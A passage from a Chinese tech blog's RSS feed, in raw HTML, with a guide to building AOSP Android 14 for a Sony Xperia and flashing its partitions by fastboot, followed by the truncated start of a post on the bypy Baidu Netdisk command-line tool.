style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libncurses5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libssl-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flex</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python-is-python3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib1g-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libelf-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dwarves</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>下载源码</h2>
<blockquote>
<p>官方参考链接： https://developer.sony.com/open-source/aosp-on-xperia-open-devices/guides/aosp-build-instructions/build-aosp-android-14/</p>
<p>经过测试官方最新源码无效，代码没有完全更新</p>
<p>这里需要选择 android-14.0.0_r34 版本进行编译</p>
</blockquote>
<h3>下载repo工具</h3>
<p>下载工具并且添加进当前用户环境变量里</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/bin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://commondatastorage.googleapis.com/git-repo-downloads/repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">~/bin/repo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a+x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/bin/repo</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">~/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$PATH</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>初始化AOSP官方源码树</h3>
<blockquote>
<p>使用 清华源更快</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/android</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/android</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># repo init -u https://android.googlesource.com/platform/manifest -b &lt;branch&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> android-14.0.0_r34</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>克隆sony官方源码库</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .repo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/sonyxperiadev/local_manifests</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local_manifests</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> android-14.0.0_r34</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../..</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>同步源码</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sync</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -c</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j8</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>合并源码</h2>
<blockquote>
<p>这一步必须执行，不单单是更新aosp源码，sony源码会合并到aosp里</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./repo_update.sh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>编译</h2>
<blockquote>
<p>编译机用了 38G 内存， 32G不够用</p>
<p>lunch 必须是 aosp_xqcc54-ap1a-userdebug</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build/envsetup.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lunch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lunch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aosp_xqcc54-ap1a-userdebug</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">make</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nproc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>电脑端驱动安装</h2>
<blockquote>
<p>插上手机用驱动精灵更方便，没有找到别的驱动，Android Studio会自带？</p>
</blockquote>
<h2>刷入</h2>
<blockquote>
<p>从官方下载OEM分区 并解压</p>
</blockquote>
<blockquote>
<p>https://developer.sony.com/file/download/software-binaries-for-aosp-android-14-0-kernel-5-4-murray-v3a</p>
</blockquote>
<p>总共需要如下镜像</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -l</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100663296</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:29</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  25165824</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:31</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dtbo.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 287400120</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> product.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 446763712</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  6月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 16:26</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SW_binaries_for_Xperia_Android_14_5.4_v3a_murray.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 897827108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 200142984</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system_ext.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   6226268</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> userdata.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      8192</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:31</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      4096</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta_system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 157900960</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100663296</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor_boot.img</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>进入fastbootd模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">adb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fastboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>按分区刷入</h3>
<blockquote>
<p>有些分区编译出来没有，不刷也能正常运行</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/boot.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vbmeta.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dtbo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/dtbo.img</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># fastboot flash recovery out/target/product/&lt;device&gt;/recovery.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vendor.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> userdata</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/userdata.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> product</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/product.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta_system</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vbmeta_system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system_ext</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/system_ext.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor_boot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vendor_boot.img</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># fastboot flash vendor_dlkm_a out/target/product/&lt;device&gt;/vendor_dlkm.img</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .....</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">pat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">h&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/SW_binaries_for_Xperia_Android_14_5.4_v3a_murray.img</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>重启</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Linux命令行百度网盘</title>
      <link>https://www.geekery.cn/note-book/BaiduNetDisk/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98.html</link>
      <guid>https://www.geekery.cn/note-book/BaiduNetDisk/Linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Linux命令行百度网盘</source>
      <description>Linux命令行百度网盘 bypy 简介 bypy 是一个基于 Python 的命令行工具，用于操作百度网盘（百度云），它为用户提供了丰富的命令行操作接口。bypy 适合在 Linux 服务器环境中使用，能够高效地进行大文件传输，支持多线程操作，具备上传、下载、同步等功能。 安装 bypy 要在 Linux 系统中安装 bypy，可以通过 pip（Py...</description>
      <pubDate>Wed, 21 Aug 2024 06:49:02 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>bypy 简介</h2>
<p>bypy 是一个基于 Python 的命令行工具，用于操作百度网盘（百度云），它为用户提供了丰富的命令行操作接口。bypy 适合在 Linux 服务器环境中使用，能够高效地进行大文件传输，支持多线程操作，具备上传、下载、同步等功能。</p>
<h2>安装 bypy</h2>
<p>要在 Linux 系统中安装 bypy，可以通过 pip（Python 包管理器）来实现：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bypy</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>使用 bypy</h2>
<h2>登录配置</h2>
<p>首次使用 bypy 之前，需要先进行配置。运行以下命令开始配置过程：</p>
